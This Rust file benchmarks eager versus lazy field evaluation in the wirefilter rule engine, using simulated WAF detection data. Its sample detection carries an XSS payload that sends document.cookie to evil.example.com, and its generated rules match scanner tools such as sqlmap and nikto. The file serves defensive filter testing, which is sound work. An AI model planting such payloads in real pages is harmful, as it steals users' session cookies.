use std::alloc::System;

#[global_allocator]
static A: System = System;

use criterion::{Criterion, criterion_group, criterion_main};
use std::net::IpAddr;
use std::str::FromStr;
use wirefilter::{
    AnyFunction, Bytes, CompoundType, DefaultCompiler, ExecutionContext, Filter, FunctionArgs,
    LhsValue, Map, SchemeBuilder, SimpleFunctionArgKind, SimpleFunctionParam, TypedArray, TypedMap,
    Type,
};

// ---------------------------------------------------------------------------
// DetectionResult — 模拟 WAF 解析结果
// ---------------------------------------------------------------------------

struct DetectionResult {
    attack_type: &'static str,
    payload: &'static str,
    method: &'static str,
    path: &'static str,
    body: &'static [u8],
    ip_src: IpAddr,
    tcp_port: i64,
    ssl: bool,
    headers: TypedMap<'static, TypedArray<'static, Bytes<'static>>>,
    query: TypedMap<'static, TypedArray<'static, Bytes<'static>>>,
}

impl DetectionResult {
    pub fn attack_type(&self) -> &'static str { self.attack_type }
    pub fn payload(&self) -> &'static str { self.payload }
    pub fn method(&self) -> &'static str { self.method }
    pub fn path(&self) -> &'static str { self.path }
    pub fn body(&self) -> &'static [u8] { self.body }
    pub fn tcp_port(&self) -> i64 { self.tcp_port }
    pub fn ip_src(&self) -> IpAddr { self.ip_src }
    pub fn ssl(&self) -> bool { self.ssl }

    pub fn header(&self, key: &[u8]) -> Option<&TypedArray<'static, Bytes<'static>>> {
        self.headers.get(key)
    }

    pub fn query(&self, key: &[u8]) -> Option<&TypedArray<'static, Bytes<'static>>> {
        self.query.get(key)
    }
}

fn build_headers() -> TypedMap<'static, TypedArray<'static, Bytes<'static>>> {
    let mut headers = TypedMap::new();

    let mut ua_arr = TypedArray::new();
    ua_arr.push(Bytes::from("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
    headers.insert(b"user-agent".as_slice().into(), ua_arr);

    let mut host_arr = TypedArray::new();
    host_arr.push(Bytes::from("www.example.com"));
    headers.insert(b"host".as_slice().into(), host_arr);

    let mut xff_arr = TypedArray::new();
    xff_arr.push(Bytes::from("203.0.113.45"));
    xff_arr.push(Bytes::from("70.41.3.18"));
    xff_arr.push(Bytes::from("150.172.238.178"));
    headers.insert(b"x-forwarded-for".as_slice().into(), xff_arr);

    let mut cookie_arr = TypedArray::new();
    cookie_arr.push(Bytes::from("session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c; _ga=GA1.2.123456789.1609459200; _gid=GA1.2.987654321.1609459200; csrf_token=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6; theme=dark; lang=en-US; preferences=%7B%22notifications%22%3Atrue%2C%22autoplay%22%3Afalse%2C%22quality%22%3A%22hd%22%7D; last_visit=2024-01-15T08%3A30%3A00Z; ab_test=variant_b; tracking_id=UA-12345678-1; referrer=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dexample"));
    headers.insert(b"cookie".as_slice().into(), cookie_arr);

    let mut auth_arr = TypedArray::new();
    auth_arr.push(Bytes::from("Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAifQ.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwiYXVkIjoiaHR0cHM6Ly9hcGkuZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyOjEyMzQ1IiwiaWF0IjoxNjA5NDU5MjAwLCJleHAiOjE2MDk0NjI4MDB9"));
    headers.insert(b"authorization".as_slice().into(), auth_arr);

    let mut ct_arr = TypedArray::new();
    ct_arr.push(Bytes::from("application/json; charset=utf-8"));
    headers.insert(b"content-type".as_slice().into(), ct_arr);

    let mut cl_arr = TypedArray::new();
    cl_arr.push(Bytes::from("2048"));
    headers.insert(b"content-length".as_slice().into(), cl_arr);

    let mut accept_arr = TypedArray::new();
    accept_arr.push(Bytes::from("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"));
    headers.insert(b"accept".as_slice().into(), accept_arr);

    let mut enc_arr = TypedArray::new();
    enc_arr.push(Bytes::from("gzip, deflate, br"));
    headers.insert(b"accept-encoding".as_slice().into(), enc_arr);

    let mut lang_arr = TypedArray::new();
    lang_arr.push(Bytes::from("en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"));
    headers.insert(b"accept-language".as_slice().into(), lang_arr);

    let mut conn_arr = TypedArray::new();
    conn_arr.push(Bytes::from("keep-alive"));
    headers.insert(b"connection".as_slice().into(), conn_arr);

    let mut ref_arr = TypedArray::new();
    ref_arr.push(Bytes::from("https://www.example.com/dashboard/settings?tab=security&section=2fa"));
    headers.insert(b"referer".as_slice().into(), ref_arr);

    let mut origin_arr = TypedArray::new();
    origin_arr.push(Bytes::from("https://www.example.com"));
    headers.insert(b"origin".as_slice().into(), origin_arr);

    let mut cache_arr = TypedArray::new();
    cache_arr.push(Bytes::from("no-cache"));
    headers.insert(b"cache-control".as_slice().into(), cache_arr);

    let mut xrid_arr = TypedArray::new();
    xrid_arr.push(Bytes::from("req-550e8400-e29b-41d4-a716-446655440000"));
    headers.insert(b"x-request-id".as_slice().into(), xrid_arr);

    let mut xffproto_arr = TypedArray::new();
    xffproto_arr.push(Bytes::from("https"));
    headers.insert(b"x-forwarded-proto".as_slice().into(), xffproto_arr);

    let mut xffhost_arr = TypedArray::new();
    xffhost_arr.push(Bytes::from("api.example.com"));
    headers.insert(b"x-forwarded-host".as_slice().into(), xffhost_arr);

    let mut dnt_arr = TypedArray::new();
    dnt_arr.push(Bytes::from("1"));
    headers.insert(b"dnt".as_slice().into(), dnt_arr);

    let mut sec_fetch_arr = TypedArray::new();
    sec_fetch_arr.push(Bytes::from("same-origin"));
    headers.insert(b"sec-fetch-mode".as_slice().into(), sec_fetch_arr);

    let mut sec_site_arr = TypedArray::new();
    sec_site_arr.push(Bytes::from("same-origin"));
    headers.insert(b"sec-fetch-site".as_slice().into(), sec_site_arr);

    headers
}

fn build_query() -> TypedMap<'static, TypedArray<'static, Bytes<'static>>> {
    let mut query = TypedMap::new();

    let mut id_arr = TypedArray::new();
    id_arr.push(Bytes::from("><script>alert(1)</script>"));
    id_arr.push(Bytes::from("normal_value"));
    query.insert(b"id".as_slice().into(), id_arr);

    let mut page_arr = TypedArray::new();
    page_arr.push(Bytes::from("1"));
    query.insert(b"page".as_slice().into(), page_arr);

    let mut sort_arr = TypedArray::new();
    sort_arr.push(Bytes::from("created_at"));
    query.insert(b"sort".as_slice().into(), sort_arr);

    let mut order_arr = TypedArray::new();
    order_arr.push(Bytes::from("desc"));
    query.insert(b"order".as_slice().into(), order_arr);

    let mut filter_arr = TypedArray::new();
    filter_arr.push(Bytes::from("status:active"));
    filter_arr.push(Bytes::from("type:premium"));
    query.insert(b"filter".as_slice().into(), filter_arr);

    let mut search_arr = TypedArray::new();
    search_arr.push(Bytes::from("example product query with special chars & < > \" '"));
    query.insert(b"q".as_slice().into(), search_arr);

    let mut token_arr = TypedArray::new();
    token_arr.push(Bytes::from("eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoxMjM0fQ"));
    query.insert(b"token".as_slice().into(), token_arr);

    let mut lang_arr = TypedArray::new();
    lang_arr.push(Bytes::from("en"));
    query.insert(b"lang".as_slice().into(), lang_arr);

    let mut ver_arr = TypedArray::new();
    ver_arr.push(Bytes::from("2.1.0"));
    query.insert(b"v".as_slice().into(), ver_arr);

    let mut debug_arr = TypedArray::new();
    debug_arr.push(Bytes::from("false"));
    query.insert(b"debug".as_slice().into(), debug_arr);

    query
}

fn sample_detection() -> DetectionResult {
    DetectionResult {
        attack_type: "xss",
        payload: r#"<img src=x onerror=alert(document.cookie)><svg/onload=fetch('https://evil.example.com/steal?c='+document.cookie)>"#,
        method: "POST",
        path: "/api/v2/users/12345/settings?tab=security&section=2fa&action=enable",
        body: br#"{"event":"user_action","data":{"user_id":12345,"action":"update_settings","settings":{"2fa_enabled":true,"notifications":{"email":true,"sms":false,"push":true},"privacy":{"profile_visibility":"friends","search_indexing":false},"security":{"login_alerts":true,"session_timeout":3600,"ip_whitelist":["203.0.113.0/24","198.51.100.0/24"]}},"timestamp":"2024-01-15T08:30:00Z","request_id":"req-550e8400-e29b-41d4-a716-446655440000"}"#,
        ip_src: IpAddr::from_str("203.0.113.45").unwrap(),
        tcp_port: 443,
        ssl: true,
        headers: build_headers(),
        query: build_query(),
    }
}

// ---------------------------------------------------------------------------
// Eager: 每轮迭代构建 Map + set_field_value
// ---------------------------------------------------------------------------

fn build_standard_scheme() -> wirefilter::Scheme {
    use wirefilter::Scheme;
    let mut builder = Scheme! {
        attack_type: Bytes,
        payload: Bytes,
        http.method: Bytes,
        http.path: Bytes,
        http.header: Map(Array(Bytes)),
        http.query: Map(Array(Bytes)),
        http.body: Bytes,
        tcp.port: Int,
        ip.src: Ip,
        ssl: Bool,
    };
    builder.add_function("any", AnyFunction::default()).unwrap();
    builder.build()
}

fn fill_standard(
    ctx: &mut ExecutionContext<'static, ()>,
    scheme: &wirefilter::Scheme,
    det: &DetectionResult,
) {
    ctx.set_field_value(scheme.get_field("attack_type").unwrap(), det.attack_type())
        .unwrap();
    ctx.set_field_value(scheme.get_field("payload").unwrap(), det.payload())
        .unwrap();
    ctx.set_field_value(scheme.get_field("http.method").unwrap(), det.method())
        .unwrap();
    ctx.set_field_value(scheme.get_field("http.path").unwrap(), det.path())
        .unwrap();
    ctx.set_field_value(scheme.get_field("http.body").unwrap(), Bytes::from(det.body()))
        .unwrap();
    ctx.set_field_value(scheme.get_field("tcp.port").unwrap(), det.tcp_port())
        .unwrap();
    ctx.set_field_value(scheme.get_field("ip.src").unwrap(), det.ip_src())
        .unwrap();
    ctx.set_field_value(
        scheme.get_field("ssl").unwrap(),
        LhsValue::Bool(det.ssl()),
    )
        .unwrap();
    // 每轮构建新 Map，move 进 ctx
    ctx.set_field_value(scheme.get_field("http.header").unwrap(), Map::from(build_headers()))
        .unwrap();
    ctx.set_field_value(scheme.get_field("http.query").unwrap(), Map::from(build_query()))
        .unwrap();
}

// 只更新 Map 字段（部分更新）
fn update_standard_maps(
    ctx: &mut ExecutionContext<'static, ()>,
    scheme: &wirefilter::Scheme,
) {
    ctx.set_field_value(scheme.get_field("http.header").unwrap(), Map::from(build_headers()))
        .unwrap();
    ctx.set_field_value(scheme.get_field("http.query").unwrap(), Map::from(build_query()))
        .unwrap();
}

// ---------------------------------------------------------------------------
// Lazy: 每轮迭代构建 DetectionResult + move 进 user_data
// ---------------------------------------------------------------------------

fn build_lazy_scheme() -> wirefilter::Scheme {
    let mut builder = SchemeBuilder::new();

    builder
        .add_lazy_field(
            "attack_type",
            Type::Bytes,
            |d: &DetectionResult| Some(LhsValue::Bytes(Bytes::from(d.attack_type()))),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "payload",
            Type::Bytes,
            |d: &DetectionResult| Some(LhsValue::Bytes(Bytes::from(d.payload()))),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "http.method",
            Type::Bytes,
            |d: &DetectionResult| Some(LhsValue::Bytes(Bytes::from(d.method()))),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "http.path",
            Type::Bytes,
            |d: &DetectionResult| Some(LhsValue::Bytes(Bytes::from(d.path()))),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "http.body",
            Type::Bytes,
            |d: &DetectionResult| Some(LhsValue::Bytes(Bytes::from(d.body()))),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "tcp.port",
            Type::Int,
            |d: &DetectionResult| Some(LhsValue::Int(d.tcp_port())),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "ip.src",
            Type::Ip,
            |d: &DetectionResult| Some(LhsValue::Ip(d.ip_src())),
        )
        .unwrap();
    builder
        .add_lazy_field(
            "ssl",
            Type::Bool,
            |d: &DetectionResult| Some(LhsValue::Bool(d.ssl())),
        )
        .unwrap();

    builder
        .add_lazy_method(
            "http.header",
            vec![SimpleFunctionParam {
                arg_kind: SimpleFunctionArgKind::Both,
                val_type: Type::Bytes,
            }],
            vec![],
            Type::Array(CompoundType::from(Type::Bytes)),
            |d: &DetectionResult, args: FunctionArgs| {
                let arg = args.next()?.ok()?;
                let key = match &arg {
                    LhsValue::Bytes(b) => b,
                    _ => return None,
                };
                d.header(key.as_ref()).map(|arr| LhsValue::Array(arr.as_array()))
            },
        )
        .unwrap();

    builder
        .add_lazy_method(
            "http.query",
            vec![SimpleFunctionParam {
                arg_kind: SimpleFunctionArgKind::Both,
                val_type: Type::Bytes,
            }],
            vec![],
            Type::Array(CompoundType::from(Type::Bytes)),
            |d: &DetectionResult, args: FunctionArgs| {
                let arg = args.next()?.ok()?;
                let key = match &arg {
                    LhsValue::Bytes(b) => b,
                    _ => return None,
                };
                d.query(key.as_ref()).map(|arr| LhsValue::Array(arr.as_array()))
            },
        )
        .unwrap();

    builder.add_function("any", AnyFunction::default()).unwrap();
    builder.build()
}

// ===========================================================================
// Benchmark 1: 完整请求生命周期 — 构建 + 更新 + 执行
// 两者都包含构建成本（模拟 HTTP 解析器产出数据）
// eager: clear → build Map + fill → execute
// lazy:  build DetectionResult + move → execute
// ===========================================================================

fn bench_full_workflow(c: &mut Criterion) {
    let std_scheme = build_standard_scheme();
    let std_rule = r#"attack_type == "xss" && any(http.header["user-agent"][*] contains "Chrome") && ssl && tcp.port == 443"#;
    let std_filter: Filter<()> = std_scheme.parse(std_rule).unwrap().compile();

    let lazy_scheme = build_lazy_scheme();
    let lazy_rule = r#"attack_type() == "xss" && any(http.header("user-agent")[*] contains "Chrome") && ssl() && tcp.port() == 443"#;
    let lazy_filter: Filter<DetectionResult> = lazy_scheme
        .parse(lazy_rule)
        .unwrap()
        .compile_with_compiler(&mut DefaultCompiler::<DetectionResult>::new());

    let mut group = c.benchmark_group("full_workflow");

    group.bench_function("eager_build_fill_execute", |b| {
        let mut ctx = ExecutionContext::<()>::new(&std_scheme);
        let det = sample_detection();
        b.iter(|| {
            ctx.clear();
            fill_standard(&mut ctx, &std_scheme, &det);
            std_filter.execute(&ctx).unwrap();
        });
    });

    group.bench_function("lazy_build_update_execute", |b| {
        let mut ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());
        b.iter(|| {
            *ctx.get_user_data_mut() = sample_detection();
            lazy_filter.execute(&ctx).unwrap();
        });
    });

    group.finish();
}

// ===========================================================================
// Benchmark 2: 部分更新 — 只更新 headers/query
// eager: build Map + set_field_value → execute
// lazy:  build TypedMap + assign fields → execute
// ===========================================================================

fn bench_partial_update(c: &mut Criterion) {
    let std_scheme = build_standard_scheme();
    let std_rule = r#"attack_type == "xss" && any(http.header["user-agent"][*] contains "Chrome") && ssl && tcp.port == 443"#;
    let std_filter: Filter<()> = std_scheme.parse(std_rule).unwrap().compile();

    let lazy_scheme = build_lazy_scheme();
    let lazy_rule = r#"attack_type() == "xss" && any(http.header("user-agent")[*] contains "Chrome") && ssl() && tcp.port() == 443"#;
    let lazy_filter: Filter<DetectionResult> = lazy_scheme
        .parse(lazy_rule)
        .unwrap()
        .compile_with_compiler(&mut DefaultCompiler::<DetectionResult>::new());

    let mut group = c.benchmark_group("partial_update");

    group.bench_function("eager_build_maps_execute", |b| {
        let mut ctx = ExecutionContext::<()>::new(&std_scheme);
        let det = sample_detection();
        fill_standard(&mut ctx, &std_scheme, &det);
        b.iter(|| {
            update_standard_maps(&mut ctx, &std_scheme);
            std_filter.execute(&ctx).unwrap();
        });
    });

    group.bench_function("lazy_build_maps_execute", |b| {
        let mut ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());
        b.iter(|| {
            let ud = ctx.get_user_data_mut();
            ud.headers = build_headers();
            ud.query = build_query();
            lazy_filter.execute(&ctx).unwrap();
        });
    });

    group.finish();
}

// ===========================================================================
// Benchmark 3: 仅更新开销 — 不执行
// ===========================================================================

fn bench_update_only(c: &mut Criterion) {
    let std_scheme = build_standard_scheme();
    let lazy_scheme = build_lazy_scheme();

    let mut group = c.benchmark_group("update_only");

    group.bench_function("eager_clear_fill", |b| {
        let mut ctx = ExecutionContext::<()>::new(&std_scheme);
        let det = sample_detection();
        b.iter(|| {
            ctx.clear();
            fill_standard(&mut ctx, &std_scheme, &det);
        });
    });

    group.bench_function("lazy_build_update", |b| {
        let mut ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());
        b.iter(|| {
            *ctx.get_user_data_mut() = sample_detection();
        });
    });

    group.bench_function("eager_build_maps", |b| {
        let mut ctx = ExecutionContext::<()>::new(&std_scheme);
        let det = sample_detection();
        fill_standard(&mut ctx, &std_scheme, &det);
        b.iter(|| {
            update_standard_maps(&mut ctx, &std_scheme);
        });
    });

    group.bench_function("lazy_build_maps", |b| {
        let mut ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());
        b.iter(|| {
            let ud = ctx.get_user_data_mut();
            ud.headers = build_headers();
            ud.query = build_query();
        });
    });

    group.finish();
}

// ===========================================================================
// Benchmark 4: execute_only — ctx 预填好，只测执行开销
// ===========================================================================

fn bench_execute_only(c: &mut Criterion) {
    let std_scheme = build_standard_scheme();
    let std_rule =
        r#"attack_type == "xss" && any(http.header["user-agent"][*] contains "Chrome") && ssl && tcp.port == 443"#;
    let std_filter: Filter<()> = std_scheme.parse(std_rule).unwrap().compile();
    let det = sample_detection();
    let mut std_ctx = ExecutionContext::<()>::new(&std_scheme);
    fill_standard(&mut std_ctx, &std_scheme, &det);

    let lazy_scheme = build_lazy_scheme();
    let lazy_rule =
        r#"attack_type() == "xss" && any(http.header("user-agent")[*] contains "Chrome") && ssl() && tcp.port() == 443"#;
    let lazy_filter: Filter<DetectionResult> = lazy_scheme
        .parse(lazy_rule)
        .unwrap()
        .compile_with_compiler(&mut DefaultCompiler::<DetectionResult>::new());
    let lazy_ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());

    let mut group = c.benchmark_group("execute_only");

    group.bench_function("eager", |b| {
        b.iter(|| std_filter.execute(&std_ctx).unwrap());
    });

    group.bench_function("lazy", |b| {
        b.iter(|| lazy_filter.execute(&lazy_ctx).unwrap());
    });

    group.finish();
}

// ===========================================================================
// Benchmark 5: 短路求值 — lazy 最大优势场景
// 规则在第一个条件就失败，lazy 不计算后续字段
// eager 仍然必须构建并填充所有字段（包括昂贵的 Map）
// ===========================================================================

fn bench_short_circuit(c: &mut Criterion) {
    let std_scheme = build_standard_scheme();
    let std_rule = r#"attack_type == "nonexistent" && any(http.header["user-agent"][*] contains "Chrome") && any(http.query["id"][*] contains "evil")"#;
    let std_filter: Filter<()> = std_scheme.parse(std_rule).unwrap().compile();

    let lazy_scheme = build_lazy_scheme();
    let lazy_rule = r#"attack_type() == "nonexistent" && any(http.header("user-agent")[*] contains "Chrome") && any(http.query("id")[*] contains "evil")"#;
    let lazy_filter: Filter<DetectionResult> = lazy_scheme
        .parse(lazy_rule)
        .unwrap()
        .compile_with_compiler(&mut DefaultCompiler::<DetectionResult>::new());

    let mut group = c.benchmark_group("short_circuit");

    // Eager: must build + fill ALL fields including Map, even though rule fails at first condition
    group.bench_function("eager_build_fill_fail", |b| {
        let mut ctx = ExecutionContext::<()>::new(&std_scheme);
        let det = sample_detection();
        b.iter(|| {
            ctx.clear();
            fill_standard(&mut ctx, &std_scheme, &det);
            std_filter.execute(&ctx).unwrap();
        });
    });

    // Lazy: build DetectionResult + move + execute.
    // Only attack_type() getter is called — header/query never touched.
    group.bench_function("lazy_build_execute_fail", |b| {
        let mut ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());
        b.iter(|| {
            *ctx.get_user_data_mut() = sample_detection();
            lazy_filter.execute(&ctx).unwrap();
        });
    });

    group.finish();
}

// ===========================================================================
// Benchmark 6: 100 条规则
// ===========================================================================

fn generate_100_rules() -> Vec<String> {
    let attack_types = [
        "sql_injection", "rce", "xxe", "ssrf", "lfi", "rfi",
        "command_injection", "path_traversal",
    ];
    let paths = [
        "/admin", "/login", "/api/users", "/upload",
        "/config", "/debug", "/console", "/graphql",
    ];
    let methods = ["POST", "PUT", "DELETE", "PATCH"];
    let uas = [
        "sqlmap", "nikto", "nmap", "dirbuster",
        "wfuzz", "gobuster", "masscan", "zgrab",
    ];
    let query_keys = ["id", "page"];

    (0..100)
        .map(|i| {
            format!(
                r#"attack_type == "{}" && http.path contains "{}" && http.method == "{}" && any(http.header["user-agent"][*] contains "{}") && any(http.query["{}"][*] contains "evil")"#,
                attack_types[i % 8], paths[i % 8], methods[i % 4], uas[i % 8], query_keys[i % 2]
            )
        })
        .collect()
}

fn generate_100_lazy_rules() -> Vec<String> {
    let attack_types = [
        "sql_injection", "rce", "xxe", "ssrf", "lfi", "rfi",
        "command_injection", "path_traversal",
    ];
    let paths = [
        "/admin", "/login", "/api/users", "/upload",
        "/config", "/debug", "/console", "/graphql",
    ];
    let methods = ["POST", "PUT", "DELETE", "PATCH"];
    let uas = [
        "sqlmap", "nikto", "nmap", "dirbuster",
        "wfuzz", "gobuster", "masscan", "zgrab",
    ];
    let query_keys = ["id", "page"];

    (0..100)
        .map(|i| {
            format!(
                r#"attack_type() == "{}" && http.path() contains "{}" && http.method() == "{}" && any(http.header("user-agent")[*] contains "{}") && any(http.query("{}")[*] contains "evil")"#,
                attack_types[i % 8], paths[i % 8], methods[i % 4], uas[i % 8], query_keys[i % 2]
            )
        })
        .collect()
}

fn bench_100_rules(c: &mut Criterion) {
    let std_scheme = build_standard_scheme();
    let std_rules = generate_100_rules();
    let std_filters: Vec<_> = std_rules
        .iter()
        .map(|r| std_scheme.parse(r).unwrap().compile())
        .collect();

    let lazy_scheme = build_lazy_scheme();
    let lazy_rules = generate_100_lazy_rules();
    let lazy_filters: Vec<_> = lazy_rules
        .iter()
        .map(|r| {
            lazy_scheme
                .parse(r)
                .unwrap()
                .compile_with_compiler(&mut DefaultCompiler::<DetectionResult>::new())
        })
        .collect();

    let mut group = c.benchmark_group("100_rules");

    group.bench_function("eager_build_fill_execute", |b| {
        let mut ctx = ExecutionContext::<()>::new(&std_scheme);
        let det = sample_detection();
        b.iter(|| {
            ctx.clear();
            fill_standard(&mut ctx, &std_scheme, &det);
            for filter in &std_filters {
                if filter.execute(&ctx).unwrap() {
                    break;
                }
            }
        });
    });

    group.bench_function("lazy_build_execute", |b| {
        let mut ctx = ExecutionContext::new_with(&lazy_scheme, || sample_detection());
        b.iter(|| {
            *ctx.get_user_data_mut() = sample_detection();
            for filter in &lazy_filters {
                if filter.execute(&ctx).unwrap() {
                    break;
                }
            }
        });
    });

    group.finish();
}

criterion_group! {
    name = lazy_v2_benchmarks;
    config = Criterion::default();
    targets =
        bench_full_workflow,
        bench_partial_update,
        bench_update_only,
        bench_execute_only,
        bench_short_circuit,
        bench_100_rules,
}
criterion_main!(lazy_v2_benchmarks);
